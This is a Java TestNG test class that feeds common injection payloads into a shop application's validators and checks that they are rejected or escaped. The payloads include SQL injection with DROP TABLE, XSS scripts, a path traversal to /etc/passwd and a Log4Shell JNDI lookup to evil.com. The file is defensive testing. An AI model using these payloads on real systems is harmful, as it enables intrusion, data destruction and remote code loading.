package com.manish.qa.security;

import com.manish.qa.support.TestData;
import com.manish.shop.Cart;
import com.manish.shop.DiscountCalculator;
import com.manish.shop.order.OrderService;
import com.manish.shop.order.OrderStatus;
import com.manish.shop.payment.FakePaymentGateway;
import com.manish.shop.security.InputValidator;
import org.testng.annotations.DataProvider;
import org.testng.annotations.Test;

import java.math.BigDecimal;

import static com.manish.qa.support.TestData.BACKPACK;
import static org.testng.Assert.*;

/**
 * SECURITY TESTING (code level)
 * Feeds common attack payloads (OWASP Top 10 style) into the application and checks they are
 * rejected or neutralized. Browser-level security checks are in ui/security/LoginSecurityUiTest.
 */
public class InputSecurityTest {

    @DataProvider
    public Object[][] injectionPayloads() {
        return new Object[][]{
                {"' OR '1'='1"},
                {"admin'--"},
                {"'; DROP TABLE users;--"},
                {"<script>alert(1)</script>"},
                {"../../etc/passwd"},
                {"${jndi:ldap://evil.com/a}"},   // Log4Shell-style
                {"user\u0000name"},              // null byte
                {"a".repeat(10_000)}             // oversized input
        };
    }

    @Test(groups = "security", dataProvider = "injectionPayloads")
    public void attackPayloadsAreNotValidUsernames(String payload) {
        assertFalse(InputValidator.isValidUsername(payload), "Payload should be rejected: " + payload);
    }

    @Test(groups = "security", dataProvider = "injectionPayloads")
    public void attackPayloadsAreNotValidEmails(String payload) {
        assertFalse(InputValidator.isValidEmail(payload));
    }

    @Test(groups = "security")
    public void xssPayloadIsEncodedBeforeDisplay() {
        String encoded = InputValidator.escapeHtml("<img src=x onerror=\"alert('xss')\">");
        assertFalse(encoded.contains("<"), "Raw < must not survive");
        assertFalse(encoded.contains(">"), "Raw > must not survive");
        assertFalse(encoded.contains("\""), "Raw quotes must not survive");
        assertEquals(encoded, "&lt;img src=x onerror=&quot;alert(&#x27;xss&#x27;)&quot;&gt;");
    }

    @Test(groups = "security")
    public void ampersandIsEncodedFirstSoNothingIsDoubleDecoded() {
        assertEquals(InputValidator.escapeHtml("&lt;"), "&amp;lt;");
    }

    @Test(groups = "security")
    public void couponErrorDoesNotEchoAttackerInput() {
        String payload = "<script>steal()</script>";
        IllegalArgumentException ex = expectThrows(IllegalArgumentException.class,
                () -> new DiscountCalculator().calculateDiscount(new BigDecimal("10.00"), payload, false));
        assertFalse(ex.getMessage().contains(payload), "Error messages must not reflect user input");
    }

    @Test(groups = "security")
    public void paymentWithMissingTokenIsDeclinedNotCharged() {
        FakePaymentGateway gateway = new FakePaymentGateway();
        OrderService service = TestData.orderService(TestData.stockedInventory(5), gateway);
        Cart cart = new Cart();
        cart.addItem(BACKPACK, 1);

        assertEquals(service.checkout(cart, null, false, "").status(), OrderStatus.PAYMENT_DECLINED);
        assertEquals(service.checkout(cart, null, false, null).status(), OrderStatus.PAYMENT_DECLINED);
        assertTrue(gateway.getApprovedCharges().isEmpty());
    }

    @Test(groups = "security")
    public void negativePriceProductCannotBeCreated() {
        // Stops a "negative price" exploit that would turn a purchase into a refund
        assertThrows(IllegalArgumentException.class,
                () -> new com.manish.shop.Product("X", "Hack", new BigDecimal("-100")));
    }
}
